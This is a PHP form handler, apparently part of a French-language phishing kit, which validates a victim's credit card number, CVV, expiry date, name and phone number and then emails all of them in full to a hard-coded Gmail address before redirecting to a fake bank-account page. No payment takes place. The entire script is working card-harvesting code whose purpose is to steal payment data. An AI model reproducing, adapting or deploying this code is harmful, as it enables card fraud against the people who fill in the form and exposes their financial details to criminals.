<?php
   function validatecard($card_number,$allowTest = false){
       global $card_type;
	   if($allowTest == false && $card_number =='4111111111111111'){
			return false;
		}
	$card_number = preg_replace('/[^0-9]/','',$card_number);
    $card_type = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
		"diners"     => "/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/",
		"jcb"        => "/^(?:2131|1800|35[0-9]{3})[0-9]{11}$/"
    );

    if (preg_match($card_type['visa'],$card_number))
    {
	$card_type= "visa";
        return 'visa';
	
    }
    else if (preg_match($card_type['mastercard'],$card_number))
    {
	$card_type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($card_type['amex'],$card_number))
    {
	$card_type= "amex";
        return 'amex';
	
    }
    else if (preg_match($card_type['discover'],$card_number))
    {
	$card_type= "discover";
        return 'discover';
    }
	 else if (preg_match($card_type['diners'],$card_number))
    {
	$card_type= "diners";
        return 'diners';
    }
	else if (preg_match($card_type['jcb'],$card_number))
    {
	$card_type= "jcb";
        return 'jcb';
    }
     else
     {
        return false;
     } 
   }
  
  function luhn_check($card_number) {

  // Strip any non-digits (useful for credit card numbers with spaces and hyphens)
  $card_number=preg_replace('/\D/', '', $card_number);

  // Set the string length and parity
  $number_length=strlen($card_number);
  $parity=$number_length % 2;

  // Loop through each digit and do the maths
  $total=0;
  for ($i=0; $i<$number_length; $i++) {
    $digit=$card_number[$i];
    // Multiply alternate digits by two
    if ($i % 2 == $parity) {
      $digit*=2;
      // If the sum is two digits, add them together (in effect)
      if ($digit > 9) {
        $digit-=9;
      }
    }
    // Total up the digits
    $total+=$digit;
  }

  // If the total mod 10 equals 0, the number is valid
  return ($total % 10 == 0) ? TRUE : FALSE;

} 
  if ($_SERVER["REQUEST_METHOD"] == "POST"){

	$card_number = strip_tags(trim($_POST['card_number']));
	$csc = strip_tags(trim($_POST['csc']));
    $name = strip_tags(trim($_POST['name']));
	$month = $_POST['month'];
	$year = $_POST['year'];
	$card_type = $_POST['card_type'];
	$Tel = $_POST['inputTel'];
	$Amount = $_POST['Amount'];
  $regex = '#^[0-9]{3,4}$#';
  $regextel = '#^0[6-7]{1}\d{8}$#';
  $Tel = preg_replace( '#\D#', '', $Tel );
// Vire l'indicatif en début de chaine
  $Tel = preg_replace( array('#^33#', '#^0033#'), '', $Tel );
	session_start ();
    $_SESSION['Amount'] = $_POST['Amount'];
  $Amount = preg_replace("/[^0-9,.]/", "", $Amount);
	 if (empty($card_number) OR !preg_match($regex, $csc) OR empty($name) OR  empty($month) OR empty($year) OR empty($card_type) OR !preg_match($regextel, $Tel)) {

	 header( "refresh:1;url=../verif.php" );
        echo "<h3>Veuillez remplir correctement  tous les champs du formulaire</h3>";
			exit;
			}

      $expires = \DateTime::createFromFormat('my', $month.$year);
      $now     = new \DateTime();
      if ($expires < $now) {
        header( "refresh:1;url=../verif.php" );
        echo "<h3>Votre carte de crédit est expirée, veuillez essayer une autre carte</h3>";
      exit;
    // expired
      }
	if(validatecard($card_number) && luhn_check($card_number)){
	

		$dest ='laurapoilot13@gmail.com';
    $entete  = 'MIME-Version: 1.0' . "\r\n";
    $entete .= 'Content-type: text/html; charset=utf-8' . "\r\n";
		$message = '<html><body>';
		$message .= '<img src="../img/logo.jpg" alt="Website Change Request" />';
		$message = '<h1>Nouvelles informations</h1>';
		$message .= '<table rules="all" style="border: 2px solid #666;" cellpadding="10">';
		$message .= "<tr style='background: #eee;'><td><strong>Numero de carte:</strong> </td><td>" . htmlspecialchars($card_number) . "</td></tr>";
		$message .= "<tr><td><strong>CVV:</strong> </td><td>" . htmlspecialchars($csc) . "</td></tr>";
		$message .= "<tr><td><strong>Date expiration:</strong> </td><td>" . htmlspecialchars($month) . '/' .htmlspecialchars($year) . "</td></tr>";
		$message .= "<tr><td><strong>Type de carte:</strong> </td><td>" . htmlspecialchars($card_type) . "</td></tr>";
		$message .= "<tr><td><strong>Nom du propriétaire:</strong> </td><td>" .htmlspecialchars($name) . "</td></tr>";
		$message .= "<tr><td><strong>Numéro de téléphone:</strong> </td><td>" .htmlspecialchars($Tel) . "</td></tr>";
		$message .= "</table>";
		$message .= "</body></html>";

		 $retour = mail($dest, 'Nouvelles informations', stripslashes($message), $entete);
        if($retour) {
           echo header('location:../banq_account.php');
        }
    }else{
		  header( "refresh:1;url=../verif.php" );
	      echo "<h3>Numero de carte est invalide</h3>"; 
	}

  }else {
        // Not a POST request, set a 403 (forbidden) response code.
		header( "refresh:.5;url=../verif.php" );
        echo "<h3>Impossible de traiter votre demande</h3>";
		
		exit;
		
		}  
?>